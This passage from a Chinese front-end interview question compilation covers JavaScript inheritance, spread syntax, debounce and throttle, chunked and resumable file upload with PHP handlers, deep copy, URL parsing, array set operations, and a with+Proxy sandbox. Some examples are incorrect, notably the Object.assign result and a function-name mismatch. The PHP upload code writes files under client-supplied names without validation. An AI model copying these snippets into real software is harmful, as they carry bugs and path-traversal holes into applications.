Parent.call(this, name, id); // Parent.apply(this, arguments); &#125; inheritPrototype(Child, Parent); 38、ES6继承class Parent &#123; constructor() &#123; this.name = \"kif\"; this.age = 12; &#125; &#125; class Child extends Parent &#123; constructor(id) &#123; super(); this.id = id; &#125; &#125; let p = new Child(); console.log(p.name); 39、扩展操作符…适用类型：数组、对象、字符串。 复杂数据类型都可以，当要转化为可迭代数据结构时可设置对象的迭代器对扩展运算符扩展出来的值进行操作。 基础数据只有string可以使用扩展运算符，number,boolean,null,undefined无效 扩展运算符的应用场景 // 1、函数调用 function add(x, y) &#123; return x + y; &#125; add(...[4, 38]); function f(v, w, x, y, z) &#123; &#125; f(-1, ...[0, 1], 2, ...[3]); // 123456789 //2.往数组里push多个元素 var arr1 = [0, 1, 2]; var arr2 = [3, 4, 5]; arr1.push(...arr2); console.log(arr1); //[0,1,2,3,4,5] //123456 //3.替代函数的apply方法 function f(x, y, z) &#123; &#125; var args = [0, 1, 2]; f.apply(null, args); //ES5 的写法 f(...args); //ES6的写法 // 123456 //4.求一个数组的最大数简化 Math.max.apply(null, [14, 3, 77]) //ES5 的写法 Math.max(...[14, 3, 77]) //ES6 的写法，等同于Math.max(14, 3, 77) //1234 //5.扩展运算符后面可以放表达式 const arr = [...(5 > 0 ? ['a'] : []),'b']; console.log(arr); //['a','b'] //1234 //6.与解构赋值结合，用于生成数组 const a1 = [1, 2]; const a2 = [...a1]; //写法1 const [...a2] = a1; //写法2 const [first, ...rest] = [1, 2, 3, 4, 5]; first //1 rest //[2, 3, 4, 5] const [first, ...rest] = []; first //undefined rest //[] const [first, ...rest] = [\"foo\"]; first //\"foo\" rest //[] //1234567891011121314151617 //7.合并数组 [...arr1, ...arr2, ...arr3] //[ 'a', 'b', 'c', 'd', 'e' ] //8.数组的克隆——————————————————————特别注意 var arr1 = [0, 1, 2]; var arr2 = [...arr1]; arr1[0]=100; console.log(arr2); //[0, 1, 2] /* 乍一看，arr2与arr1不共用引用地址，arr2不随着arr1变化，接着往下看 */ var arr1 = [0, [1,11,111], 2]; var arr2 = [...arr1]; arr1[1][0]=100; console.log(arr2); //[0, [100,11,111], 2] 40、为什么js是单线程参考答案： 这主要和js的用途有关，js是作为浏览器的脚本语言，主要是实现用户与浏览器的交互，以及操作dom；这决定了它只能是单线程，否则会带来很复杂的同步问题。 举个例子：如果js被设计了多线程，如果有一个线程要修改一个dom元素，另一个线程要删除这个dom元素，此时浏览器就会一脸茫然，不知所措。所以，为了避免复杂性，从一诞生，JavaScript就是单线程，这已经成了这门语言的核心特征，将来也不会改变 扩展： 什么是进程？ 进程：是cpu分配资源的最小单位；（是能拥有资源和独立运行的最小单位） 什么是线程？ 线程：是cpu调度的最小单位；（线程是建立在进程的基础上的一次程序运行单位，一个进程中可以有多个线程） 浏览器是多进程的？ 放在浏览器中，每打开一个tab页面，其实就是新开了一个进程，在这个进程中，还有ui渲染线程，js引擎线程，http请求线程等。 所以，浏览器是一个多进程的。 为了利用多核CPU的计算能力，HTML5提出Web Worker标准，允许JavaScript脚本创建多个线程，但是子线程完全受主线程控制，且不得操作DOM。所以，这个新标准并没有改变JavaScript单线程的本质。 41、死锁参考答案： 死锁是指两个或两个以上的进程在执行过程中，由于竞争资源而造成阻塞的现象，若无外力作用，它们都将无法继续执行 产生原因 竞争资源引起进程死锁 可剥夺和非剥夺资源 竞争非剥夺资源 竞争临时性资源 进程推进顺序不当 产生条件 互斥条件：涉及的资源是非共享的 涉及的资源是非共享的,一段时间内某资源只由一个进程占用,如果此时还有其它进程请求资源，则请求者只能等待，直至占有资源的进程用毕释放 不剥夺条件：不能强行剥夺进程拥有的资源 进程已获得的资源，在未使用完之前，不能被剥夺，只能在使用完时由自己释放 请求和保持条件：进程在等待一新资源时继续占有已分配的资源 指进程已经保持至少一个资源，但又提出了新的资源请求，而该资源已被其它进程占有，此时请求进程阻塞，但又对自己已获得的其它资源保持不放 环路等待条件：存在一种进程的循环链，链中的每一个进程已获得的资源同时被链中的下一个进程所请求 在发生死锁时，必然存在一个进程——资源的环形链 解决办法 只要打破四个必要条件之一就能有效预防死锁的发生 42、面向对象的三个特征，分别说一下什么意思参考答案： 概念： 封装：将对象运行所需的资源封装在程序对象中——基本上，是方法和数据。对象是“公布其接口”。其他附加到这些接口上的对象不需要关心对象实现的方法即可使用这个对象。这个概念就是“不要告诉我你是怎么做的，只要做就可以了。”对象可以看作是一个自我包含的原子。对象接口包括了公共的方法和初始化数据。 继承： 继承可以解决代码复用，让编程更加靠近人类思维。当多个类存在相同的属性(变量)和方法时，可以从这些类中抽象出父类，在父类中定义这些相同的属性和方法，所有的子类不需要重新定义这些属性和方法，只需要通过继承父类中的属性和方法。 多态： 多态是指一个引用(类型)在不同情况下的多种状态。也可以理解成：多态是指通过指向父类的引用，来调用在不同子类中实现的方法。 特点： 封装可以隐藏实现细节，使得代码模块化； 继承可以扩展已存在的代码模块（类），它们的目的都是为了——代码重用。 多态就是相同的事物，调用其相同的方法，参数也相同时，但表现的行为却不同。多态分为两种，一种是行为多态与对象的多态 43、防抖和节流的原理和使用场景参考答案： 函数防抖和函数节流：优化高频率执行js代码的一种手段，js中的一些事件如浏览器的resize、scroll，鼠标的mousemove、mouseover，input输入框的keypress等事件在触发时，会不断地调用绑定在事件上的回调函数，极大地浪费资源，降低前端性能。为了优化体验，需要对这类事件进行调用次数的限制。 防抖： 在事件被触发n秒后再执行回调，如果在这n秒内又被触发，则重新计时。 根据函数防抖思路设计出第一版的最简单的防抖代码： var timer; &#x2F;&#x2F; 维护同一个timer function debounce(fn, delay) &#123; clearTimeout(timer); timer &#x3D; setTimeout(function()&#123; fn(); &#125;, delay); &#125; 上面例子中的debounce就是防抖函数，在document中鼠标移动的时候，会在onmousemove最后触发的1s后执行回调函数testDebounce；如果我们一直在浏览器中移动鼠标（比如10s），会发现会在10 + 1s后才会执行testDebounce函数（因为clearTimeout(timer)），这个就是函数防抖。 在上面的代码中，会出现一个问题，var timer只能在setTimeout的父级作用域中，这样才是同一个timer，并且为了方便防抖函数的调用和回调函数fn的传参问题，我们应该用闭包来解决这些问题。 优化后的代码： function debounce(fn, delay) &#123; var timer; // 维护一个 timer return function () &#123; var _this = this; // 取debounce执行作用域的this var args = arguments; if (timer) &#123; clearTimeout(timer); &#125; timer = setTimeout(function () &#123; fn.apply(_this, args); // 用apply指向调用debounce的对象，相当于_this.fn(args); &#125;, delay); &#125;; &#125; 使用闭包后，解决传参和封装防抖函数的问题，这样就可以在其他地方随便将需要防抖的函数传入debounce了。 节流： 每隔一段时间，只执行一次函数。 定时器实现节流函数： function throttle(fn, delay) &#123; var timer; return function () &#123; var _this = this; var args = arguments; if (timer) &#123; return; &#125; timer = setTimeout(function () &#123; fn.apply(_this, args); timer = null; // 在delay后执行完fn之后清空timer，此时timer为假，throttle触发可以进入计时器 &#125;, delay) &#125; &#125; 时间戳实现节流函数： function throttle(fn, delay) &#123; var previous = 0; // 使用闭包返回一个函数并且用到闭包函数外面的变量previous return function() &#123; var _this = this; var args = arguments; var now = new Date(); if(now - previous > delay) &#123; fn.apply(_this, args); previous = now; &#125; &#125; &#125; 异同比较 相同点： 都可以通过使用 setTimeout 实现。 目的都是，降低回调执行频率。节省计算资源。 不同点： 函数防抖，在一段连续操作结束后，处理回调，利用clearTimeout 和 setTimeout实现。函数节流，在一段连续操作中，每一段时间只执行一次，频率较高的事件中使用来提高性能。 函数防抖关注一定时间连续触发的事件只在最后执行一次，而函数节流侧重于一段时间内只执行一次。 常见应用场景 函数防抖的应用场景: 连续的事件，只需触发一次回调的场景有： 搜索框搜索输入。只需用户最后一次输入完，再发送请求 手机号、邮箱验证输入检测 窗口大小Resize。只需窗口调整完成后，计算窗口大小。防止重复渲染。 函数节流的应用场景: 间隔一段时间执行一次回调的场景有： 滚动加载，加载更多或滚到底部监听 谷歌搜索框，搜索联想功能 高频点击提交，表单重复提交 44、文件异步上传怎么实现参考答案： 1.普通表单上传使用PHP来展示常规的表单上传是一个不错的选择。首先构建文件上传的表单，并指定表单的提交内容类型为enctype=&quot;multipart/form-data&quot;，表明表单需要上传二进制数据。 &lt;form action=\"/index.php\" method=\"POST\" enctype=\"multipart/form-data\"> &lt;input type=\"file\" name=\"myfile\"> &lt;input type=\"submit\"> &lt;/form> 然后编写index.php上传文件接收代码，使用move_uploaded_file方法即可(php大法好…) $imgName = 'IMG'.time().'.'.str_replace('image/','',$_FILES[\"myfile\"]['type']); $fileName = 'upload/'.$imgName; // 移动上传文件至指定upload文件夹下，并根据返回值判断操作是否成功 if (move_uploaded_file($_FILES['myfile']['tmp_name'], $fileName))&#123; echo $fileName; &#125;else &#123; echo \"nonn\"; &#125; form表单上传大文件时，很容易遇见服务器超时的问题。通过xhr，前端也可以进行异步上传文件的操作，一般由两个思路。 2.文件编码上传第一个思路是将文件进行编码，然后在服务端进行解码，之前写过一篇在前端实现图片压缩上传的博客，其主要实现原理就是将图片转换成base64进行传递 var imgURL = URL.createObjectURL(file); ctx.drawImage(imgURL, 0, 0); // 获取图片的编码，然后将图片当做是一个很长的字符串进行传递 var data = canvas.toDataURL(\"image/jpeg\", 0.5); 在服务端需要做的事情也比较简单，首先解码base64，然后保存图片即可 $imgData = $_REQUEST['imgData']; $base64 = explode(',', $imgData)[1]; $img = base64_decode($base64); $url = './test.jpg'; if (file_put_contents($url, $img)) &#123; exit(json_encode(array( url => $url ))); &#125; base64编码的缺点在于其体积比原图片更大（因为Base64将三个字节转化成四个字节，因此编码后的文本，会比原文本大出三分之一左右），对于体积很大的文件来说，上传和解析的时间会明显增加。 更多关于base64的知识，可以参考Base64笔记。 除了进行base64编码，还可以在前端直接读取文件内容后以二进制格式上传 // 读取二进制文件 function readBinary(text)&#123; var data = new ArrayBuffer(text.length); var ui8a = new Uint8Array(data, 0); for (var i = 0; i &lt; text.length; i++)&#123; ui8a[i] = (text.charCodeAt(i) &amp; 0xff); &#125; console.log(ui8a) &#125; var reader = new FileReader(); reader.onload = function()&#123; readBinary(this.result) // 读取result或直接上传 &#125; // 把从input里读取的文件内容，放到fileReader的result字段里 reader.readAsBinaryString(file); 3.formData异步上传FormData对象主要用来组装一组用 XMLHttpRequest发送请求的键&#x2F;值对，可以更加灵活地发送Ajax请求。可以使用FormData来模拟表单提交。 let files = e.target.files // 获取input的file对象 let formData = new FormData(); formData.append('file', file); axios.post(url, formData); 服务端处理方式与直接form表单请求基本相同。 4.iframe无刷新页面在低版本的浏览器（如IE）上，xhr是不支持直接上传formdata的，因此只能用form来上传文件，而form提交本身会进行页面跳转，这是因为form表单的target属性导致的，其取值有 _self，默认值，在相同的窗口中打开响应页面 _blank，在新窗口打开 _parent，在父窗口打开 _top，在最顶层的窗口打开 framename，在指定名字的iframe中打开 如果需要让用户体验异步上传文件的感觉，可以通过framename指定iframe来实现。把form的target属性设置为一个看不见的iframe，那么返回的数据就会被这个iframe接受，因此只有该iframe会被刷新，至于返回结果，也可以通过解析这个iframe内的文本来获取。 function upload()&#123; var now = +new Date() var id = 'frame' + now $(\"body\").append(`&lt;iframe style=\"display:none;\" name=\"$&#123;id&#125;\" id=\"$&#123;id&#125;\" />`); var $form = $(\"#myForm\") $form.attr(&#123; \"action\": '/index.php', \"method\": \"post\", \"enctype\": \"multipart/form-data\", \"encoding\": \"multipart/form-data\", \"target\": id &#125;).submit() $(\"#\"+id).on(\"load\", function()&#123; var content = $(this).contents().find(\"body\").text() try&#123; var data = JSON.parse(content) &#125;catch(e)&#123; console.log(e) &#125; &#125;) &#125; 扩展： 大文件上传 现在来看看在上面提到的几种上传方式中实现大文件上传会遇见的超时问题， 表单上传和iframe无刷新页面上传，实际上都是通过form标签进行上传文件，这种方式将整个请求完全交给浏览器处理，当上传大文件时，可能会遇见请求超时的情形 通过fromData，其实际也是在xhr中封装一组请求参数，用来模拟表单请求，无法避免大文件上传超时的问题 编码上传，我们可以比较灵活地控制上传的内容 大文件上传最主要的问题就在于：在同一个请求中，要上传大量的数据，导致整个过程会比较漫长，且失败后需要重头开始上传。试想，如果我们将这个请求拆分成多个请求，每个请求的时间就会缩短，且如果某个请求失败，只需要重新发送这一次请求即可，无需从头开始，这样是否可以解决大文件上传的问题呢？ 综合上面的问题，看来大文件上传需要实现下面几个需求 支持拆分上传请求(即切片) 支持断点续传 支持显示上传进度和暂停上传 接下来让我们依次实现这些功能，看起来最主要的功能应该就是切片了。 文件切片 编码方式上传中，在前端我们只要先获取文件的二进制内容，然后对其内容进行拆分，最后将每个切片上传到服务端即可。 在JavaScript中，文件FIle对象是Blob对象的子类，Blob对象包含一个重要的方法slice，通过这个方法，我们就可以对二进制文件进行拆分。 下面是一个拆分文件的示例 function slice(file, piece = 1024 * 1024 * 5) &#123; let totalSize = file.size; // 文件总大小 let start = 0; // 每次上传的开始字节 let end = start + piece; // 每次上传的结尾字节 let chunks = [] while (start &lt; totalSize) &#123; // 根据长度截取每次需要上传的数据 // File对象继承自Blob对象，因此包含slice方法 let blob = file.slice(start, end); chunks.push(blob) start = end; end = start + piece; &#125; return chunks &#125; 将文件拆分成piece大小的分块，然后每次请求只需要上传这一个部分的分块即可 let file = document.querySelector(\"[name=file]\").files[0]; const LENGTH = 1024 * 1024 * 0.1; let chunks = slice(file, LENGTH); // 首先拆分切片 chunks.forEach(chunk=>&#123; let fd = new FormData(); fd.append(\"file\", chunk); post('/mkblk.php', fd) &#125;) 服务器接收到这些切片后，再将他们拼接起来就可以了，下面是PHP拼接切片的示例代码 $filename = './upload/' . $_POST['filename'];//确定上传的文件名 //第一次上传时没有文件，就创建文件，此后上传只需要把数据追加到此文件中 if(!file_exists($filename))&#123; move_uploaded_file($_FILES['file']['tmp_name'],$filename); &#125;else&#123; file_put_contents($filename,file_get_contents($_FILES['file']['tmp_name']),FILE_APPEND); echo $filename; &#125; 测试时记得修改nginx的server配置，否则大文件可能会提示413 Request Entity Too Large的错误。 server &#123; // ... client_max_body_size 50m; &#125; 上面这种方式来存在一些问题 无法识别一个切片是属于哪一个切片的，当同时发生多个请求时，追加的文件内容会出错 切片上传接口是异步的，无法保证服务器接收到的切片是按照请求顺序拼接的 因此接下来我们来看看应该如何在服务端还原切片。 还原切片 在后端需要将多个相同文件的切片还原成一个文件，上面这种处理切片的做法存在下面几个问题 如何识别多个切片是来自于同一个文件的，这个可以在每个切片请求上传递一个相同文件的context参数 如何将多个切片还原成一个文件 确认所有切片都已上传，这个可以通过客户端在切片全部上传后调用mkfile接口来通知服务端进行拼接 找到同一个context下的所有切片，确认每个切片的顺序，这个可以在每个切片上标记一个位置索引值 按顺序拼接切片，还原成文件 上面有一个重要的参数，即context，我们需要获取为一个文件的唯一标识，可以通过下面两种方式获取 根据文件名、文件长度等基本信息进行拼接，为了避免多个用户上传相同的文件，可以再额外拼接用户信息如uid等保证唯一性 根据文件的二进制内容计算文件的hash，这样只要文件内容不一样，则标识也会不一样，缺点在于计算量比较大. 修改上传代码，增加相关参数 // 获取context，同一个文件会返回相同的值 function createContext(file) &#123; return file.name + file.length &#125; let file = document.querySelector(\"[name=file]\").files[0]; const LENGTH = 1024 * 1024 * 0.1; let chunks = slice(file, LENGTH); // 获取对于同一个文件，获取其的context let context = createContext(file); let tasks = []; chunks.forEach((chunk, index) => &#123; let fd = new FormData(); fd.append(\"file\", chunk); // 传递context fd.append(\"context\", context); // 传递切片索引值 fd.append(\"chunk\", index + 1); tasks.push(post(\"/mkblk.php\", fd)); &#125;); // 所有切片上传完毕后，调用mkfile接口 Promise.all(tasks).then(res => &#123; let fd = new FormData(); fd.append(\"context\", context); fd.append(\"chunks\", chunks.length); post(\"/mkfile.php\", fd).then(res => &#123; console.log(res); &#125;); &#125;); 在mkblk.php接口中，我们通过context来保存同一个文件相关的切片 // mkblk.php $context = $_POST['context']; $path = './upload/' . $context; if(!is_dir($path))&#123; mkdir($path); &#125; // 把同一个文件的切片放在相同的目录下 $filename = $path .'/'. $_POST['chunk']; $res = move_uploaded_file($_FILES['file']['tmp_name'],$filename); 除了上面这种简单通过目录区分切片的方法之外，还可以将切片信息保存在数据库来进行索引。接下来是mkfile.php接口的实现，这个接口会在所有切片上传后调用 // mkfile.php $context = $_POST['context']; $chunks = (int)$_POST['chunks']; //合并后的文件名 $filename = './upload/' . $context . '/file.jpg'; for($i = 1; $i &lt;= $chunks; ++$i)&#123; $file = './upload/'.$context. '/' .$i; // 读取单个切块 $content = file_get_contents($file); if(!file_exists($filename))&#123; $fd = fopen($filename, \"w+\"); &#125;else&#123; $fd = fopen($filename, \"a\"); &#125; fwrite($fd, $content); // 将切块合并到一个文件上 &#125; echo $filename; 这样就解决了上面的两个问题： 识别切片来源 保证切片拼接顺序 断点续传 即使将大文件拆分成切片上传，我们仍需等待所有切片上传完毕，在等待过程中，可能发生一系列导致部分切片上传失败的情形，如网络故障、页面关闭等。由于切片未全部上传，因此无法通知服务端合成文件。这种情况下可以通过断点续传来进行处理。 断点续传指的是：可以从已经上传部分开始继续上传未完成的部分，而没有必要从头开始上传，节省上传时间。 由于整个上传过程是按切片维度进行的，且mkfile接口是在所有切片上传完成后由客户端主动调用的，因此断点续传的实现也十分简单： 在切片上传成功后，保存已上传的切片信息 当下次传输相同文件时，遍历切片列表，只选择未上传的切片进行上传 所有切片上传完毕后，再调用mkfile接口通知服务端进行文件合并 因此问题就落在了如何保存已上传切片的信息了，保存一般有两种策略 可以通过locaStorage等方式保存在前端浏览器中，这种方式不依赖于服务端，实现起来也比较方便，缺点在于如果用户清除了本地文件，会导致上传记录丢失 服务端本身知道哪些切片已经上传，因此可以由服务端额外提供一个根据文件context查询已上传切片的接口，在上传文件前调用该文件的历史上传记录 下面让我们通过在本地保存已上传切片记录，来实现断点上传的功能 // 获取已上传切片记录 function getUploadSliceRecord(context)&#123; let record = localStorage.getItem(context) if(!record)&#123; return [] &#125;else &#123; try&#123; return JSON.parse(record) &#125;catch(e)&#123;&#125; &#125; &#125; // 保存已上传切片 function saveUploadSliceRecord(context, sliceIndex)&#123; let list = getUploadSliceRecord(context) list.push(sliceIndex) localStorage.setItem(context, JSON.stringify(list)) &#125; 然后对上传逻辑稍作修改，主要是增加上传前检测是已经上传、上传后保存记录的逻辑 let context = createContext(file); // 获取上传记录 let record = getUploadSliceRecord(context); let tasks = []; chunks.forEach((chunk, index) => &#123; // 已上传的切片则不再重新上传 if(record.includes(index))&#123; return &#125; let fd = new FormData(); fd.append(\"file\", chunk); fd.append(\"context\", context); fd.append(\"chunk\", index + 1); let task = post(\"/mkblk.php\", fd).then(res=>&#123; // 上传成功后保存已上传切片记录 saveUploadSliceRecord(context, index) record.push(index) &#125;) tasks.push(task); &#125;); 此时上传时刷新页面或者关闭浏览器，再次上传相同文件时，之前已经上传成功的切片就不会再重新上传了。 服务端实现断点续传的逻辑基本相似，只要在getUploadSliceRecord内部调用服务端的查询接口获取已上传切片的记录即可，因此这里不再展开。 此外断点续传还需要考虑切片过期的情况：如果调用了mkfile接口，则磁盘上的切片内容就可以清除掉了，如果客户端一直不调用mkfile的接口，放任这些切片一直保存在磁盘显然是不可靠的，一般情况下，切片上传都有一段时间的有效期，超过该有效期，就会被清除掉。基于上述原因，断点续传也必须同步切片过期的实现逻辑。 上传进度和暂停 通过xhr.upload中的progress方法可以实现监控每一个切片上传进度。 上传暂停的实现也比较简单，通过xhr.abort可以取消当前未完成上传切片的上传，实现上传暂停的效果，恢复上传就跟断点续传类似，先获取已上传的切片列表，然后重新发送未上传的切片。 由于篇幅关系，上传进度和暂停的功能这里就先不实现了。 45、使用setInterval请求实时数据，返回顺序不一致怎么解决参考答案： 场景： setInterval(function() &#123; $.get(\"/path/to/server\", function(data, status) &#123; console.log(data); &#125;); &#125;, 10000); 上面的程序会每隔10秒向服务器请求一次数据，并在数据到达后存储。这个实现方法通常可以满足简单的需求，然而同时也存在着很大的缺陷：在网络情况不稳定的情况下，服务器从接收请求、发送请求到客户端接收请求的总时间有可能超过10秒，而请求是以10秒间隔发送的，这样会导致接收的数据到达先后顺序与发送顺序不一致。 解决方案： 使用setTimeout代替setInterval 程序首先设置10秒后发起请求，当数据返回后再隔10秒发起第二次请求，以此类推。这样的话虽然无法保证两次请求之间的时间间隔为固定值，但是可以保证到达数据的顺序。 function poll() &#123; setTimeout(function() &#123; $.get(\"/path/to/server\", function(data, status) &#123; console.log(data); // 发起下一次请求 poll(); &#125;); &#125;, 10000); &#125; WebSocket WebSocket 协议本质上是一个基于 TCP 的协议。 为了建立一个 WebSocket 连接，客户端浏览器首先要向服务器发起一个 HTTP 请求，这个请求和通常的 HTTP 请求不同，包含了一些附加头信息，其中附加头信息”Upgrade: WebSocket”表明这是一个申请协议升级的 HTTP 请求，服务器端解析这些附加的头信息然后产生应答信息返回给客户端，客户端和服务器端的 WebSocket 连接就建立起来了，双方就可以通过这个连接通道自由的传递信息，并且这个连接会持续存在直到客户端或者服务器端的某一方主动的关闭连接。 服务器（Node.js）： var WebSocketServer = require('ws').Server; var wss = new WebSocketServer(&#123;port: 8080&#125;); wss.on(\"connection\", function(socket) &#123; socket.on(\"message\", function(msg) &#123; console.log(msg); socket.send(\"Nice to meet you!\"); &#125;); &#125;); 客户端同样可以使用Node.js或者是浏览器实现，这里选用浏览器作为客户端： // WebSocket 为客户端JavaScript的原生对象 var ws = new WebSocket(\"ws://localhost:8080\"); ws.onopen = function (event) &#123; ws.send(\"Hello there!\"); &#125; ws.onmessage = function (event) &#123; console.log(event.data); &#125; 46、浅拷贝，深拷贝(实现方式)参考答案： 浅拷贝和深拷贝都只针对于引用数据类型，浅拷贝只复制指向某个对象的指针，而不复制对象本身，新旧对象还是共享同一块内存；但深拷贝会另外创造一个一模一样的对象，新对象跟原对象不共享内存，修改新对象不会改到原对象； 区别：浅拷贝只复制对象的第一层属性、深拷贝可以对对象的属性进行递归复制； 实现浅拷贝方法 （1）Object.assign方法 var obj = &#123; a: 1, b: 2 &#125; var obj1 = Object.assign(&#123;&#125;,obj); boj1.a = 3; console.log(obj.a) // 3 （2）for in方法 // 只复制第一层的浅拷贝 function simpleCopy(obj1) &#123; var obj2 = Array.isArray(obj1) ? [] : &#123;&#125;; for (let i in obj1) &#123; obj2[i] = obj1[i]; &#125; return obj2; &#125; var obj1 = &#123; a: 1, b: 2, c: &#123; d: 3 &#125; &#125; var obj2 = simpleCopy(obj1); obj2.a = 3; obj2.c.d = 4; alert(obj1.a); // 1 alert(obj2.a); // 3 alert(obj1.c.d); // 4 alert(obj2.c.d); // 4 实现深拷贝方法 （1）采用递归去拷贝所有层级属性 function deepClone(obj)&#123; let objClone = Array.isArray(obj)?[]:&#123;&#125;; if(obj &amp;&amp; typeof obj===\"object\")&#123; for(key in obj)&#123; if(obj.hasOwnProperty(key))&#123; //判断ojb子元素是否为对象，如果是，递归复制 if(obj[key]&amp;&amp;typeof obj[key] ===\"object\")&#123; objClone[key] = deepClone(obj[key]); &#125;else&#123; //如果不是，简单复制 objClone[key] = obj[key]; &#125; &#125; &#125; &#125; return objClone; &#125; let a=[1,2,3,4], b=deepClone(a); a[0]=2; console.log(a,b); （2）使用JSON.stringify和JSON.parse实现深拷贝：JSON.stringify把对象转成字符串，再用JSON.parse把字符串转成新的对象； function deepCopy(obj1)&#123; let _obj = JSON.stringify(obj1); let obj2 = JSON.parse(_obj); return obj2; &#125; var a = [1, [1, 2], 3, 4]; var b = deepCopy(a); b[1][0] = 2; alert(a); // 1,1,2,3,4 alert(b); // 2,2,2,3,4 （3）热门的函数库lodash，也有提供_.cloneDeep用来做深拷贝； var _ = require('lodash'); var obj1 = &#123; a: 1, b: &#123; f: &#123; g: 1 &#125; &#125;, c: [1, 2, 3] &#125;; var obj2 = _.cloneDeep(obj1); console.log(obj1.b.f === obj2.b.f); // false 47、获取当前页面url参考答案： window.location.href (设置或获取整个 URL 为字符串) var test = window.location.href; alert(test); // 返回：http://i.cnblogs.com/EditPosts.aspx?opt=1 window.location.protocol (设置或获取 URL 的协议部分) var test = window.location.protocol; alert(test); //返回：http: window.location.host (设置或获取 URL 的主机部分) var test = window.location.host; alert(test); //返回：i.cnblogs.com window.location.port (设置或获取与 URL 关联的端口号码) var test = window.location.port; alert(test); //返回：空字符(如果采用默认的80端口 (update:即使添加了:80)，那么返回值并不是默认的80而是空字符) window.location.pathname (设置或获取与 URL 的路径部分（就是文件地址）) var test = window.location.pathname; alert(test); //返回：/EditPosts.aspx window.location.search (设置或获取 href 属性中跟在问号后面的部分) var test = window.location.search; alert(test); //返回：?opt=1 （PS：获得查询（参数）部分，除了给动态语言赋值以外，我们同样可以给静态页面，并使用javascript来获得相信应的参数值。） window.location.hash (设置或获取 href 属性中在井号“#”后面的分段) var test = window.location.hash; alert(test); //返回：空字符(因为url中没有) js获取url中的参数值* 正则法 function getQueryString(name) &#123; var reg = new RegExp('(^|&amp;)' + name + '=([^&amp;]*)(&amp;|$)', 'i'); var r = window.location.search.substr(1).match(reg); if (r != null) &#123; return unescape(r[2]); &#125; return null; &#125; // 这样调用： alert(GetQueryString(\"参数名1\")); alert(GetQueryString(\"参数名2\")); alert(GetQueryString(\"参数名3\")); split拆分法 function GetRequest() &#123; var url = location.search; //获取url中\"?\"符后的字串 var theRequest = new Object(); if (url.indexOf(\"?\") != -1) &#123; var str = url.substr(1); strs = str.split(\"&amp;\"); for(var i = 0; i &lt; strs.length; i ++) &#123; theRequest[strs[i].split(\"=\")[0]] = unescape(strs[i].split(\"=\")[1]); &#125; &#125; return theRequest; &#125; var Request = new Object(); Request = GetRequest();&lt;br>// var id=Request[\"id\"]; // var 参数1,参数2,参数3,参数N; // 参数1 = Request['参数1']; // 参数2 = Request['参数2']; // 参数3 = Request['参数3']; // 参数N = Request['参数N']; 指定取比如说一个url：http://i.cnblogs.com/?j=js, 我们想得到参数j的值，可以通过以下函数调用。 function GetQueryString(name) &#123; var reg = new RegExp(\"(^|&amp;)\" + name + \"=([^&amp;]*)(&amp;|$)\", \"i\"); var r = window.location.search.substr(1).match(reg); //获取url中\"?\"符后的字符串并正则匹配 var context = \"\"; if (r != null) context = r[2]; reg = null; r = null; return context == null || context == \"\" || context == \"undefined\" ? \"\" : context; &#125; alert(GetQueryString(\"j\")); 单个参数的获取方法 function GetRequest() &#123; var url = location.search; //获取url中\"?\"符后的字串 if (url.indexOf(\"?\") != -1) &#123;? //判断是否有参数 var str = url.substr(1); //从第一个字符开始 因为第0个是?号 获取所有除问号的所有符串 strs = str.split(\"=\");? //用等号进行分隔 （因为知道只有一个参数 //所以直接用等号进分隔 如果有多个参数 要用&amp;号分隔 再用等号进行分隔） alert(strs[1]);???? //直接弹出第一个参数 （如果有多个参数 还要进行循环的） &#125; &#125; 48、js中两个数组怎么取交集+(差集、并集、补集)ES5：交集： let arr1 = [1, 2, 3, 4, 5, 6]; let arr2 = [3, 4, 5, 6, 7, 8, 9]; function getIntersection(arr1, arr2) &#123; let newArr = arr1.filter((item) => &#123; console.log(arr2.indexOf(item)); return arr2.indexOf(item) > -1 &#125;); return newArr; &#125; // console.log(getIntersection(arr1, arr2)); 并集： function getSet(arr1, arr2) &#123; let newArr = arr2.filter((item) => &#123; return arr1.indexOf(item) == -1; &#125;); return arr1.concat(newArr); &#125; console.log(getSet(arr1, arr2)); 补集： function getComplement(arr1, arr2) &#123; let newArr1 = arr1.filter((item) => &#123; return arr2.indexOf(item) == -1; &#125;); let newArr2 = arr2.filter((item) => &#123; return arr1.indexOf(item) == -1; &#125;); return newArr1.concat(newArr2); &#125; ES6：交集： let arr1 = [1, 2, 3, 4, 5, 6]; let arr2 = [3, 4, 5, 6, 7, 8, 9]; function getIntersection(arr1, arr2) &#123; let y = new Set(arr2); return arr1.filter((x) => y.has(x)); &#125; console.log(getIntersection(arr1, arr2)); 并集： let arr1 = [1, 2, 3, 4, 5, 6]; let arr2 = [3, 4, 5, 6, 7, 8, 9]; function getSet(arr1, arr2) &#123; let x = arr1.concat(arr2); return [...new Set(x)]; &#125; console.log(getSet(arr1, arr2)); 49、沙箱隔离怎么做的什么原理参考答案： 沙箱，即sandbox，顾名思义，就是让你的程序跑在一个隔离的环境下，不对外界的其他程序造成影响，通过创建类似沙盒的独立作业环境，在其内部运行的程序并不能对硬盘产生永久性的影响。 实现沙箱的三种方法 借助with + new Function 首先从最简陋的方法说起，假如你想要通过eval和function直接执行一段代码，这是不现实的，因为代码内部可以沿着作用域链往上找，篡改全局变量，这是我们不希望的，所以你需要让沙箱内的变量访问都在你的监控范围内；不过，你可以使用with API，在with的块级作用域下，变量访问会优先查找你传入的参数对象，之后再往上找，所以相当于你变相监控到了代码中的“变量访问”： function compileCode (src) &#123; src = 'with (exposeObj) &#123;' + src + '&#125;' return new Function('exposeObj', src) &#125; 接下里你要做的是，就是暴露可以被访问的变量exposeObj，以及阻断沙箱内的对外访问。通过es6提供的proxy特性，可以获取到对对象上的所有改写： function compileCode (src) &#123; src = `with (exposeObj) &#123; $&#123;src&#125; &#125;` return new Function('exposeObj', src) &#125; function proxyObj(originObj)&#123; let exposeObj = new Proxy(originObj,&#123; has:(target,key)=>&#123; if([\"console\",\"Math\",\"Date\"].indexOf(key)>=0)&#123; return target[key] &#125; if(!target.hasOwnProperty(key))&#123; throw new Error(`Illegal operation for key $&#123;key&#125;`) &#125; return target[key] &#125;, &#125;) return exposeObj &#125; function createSandbox(src,obj)&#123; let proxy = proxyObj(obj) compileCode(src).call(proxy,proxy) //绑定this 防止this访问window &#125; 通过设置has函数，可以监听到变量的访问，在上述代码中，仅暴露个别外部变量供代码访问，其余不存在的属性，都会直接抛出error。其实还存在get、set函数，但是如果get和set函数只能拦截到当前对象属性的操作，对外部变量属性的读写操作无法监听到，所以只能使用has函数了。接下来我们测试一下： const testObj = &#123; value:1, a:&#123; b: &#125; &#125; 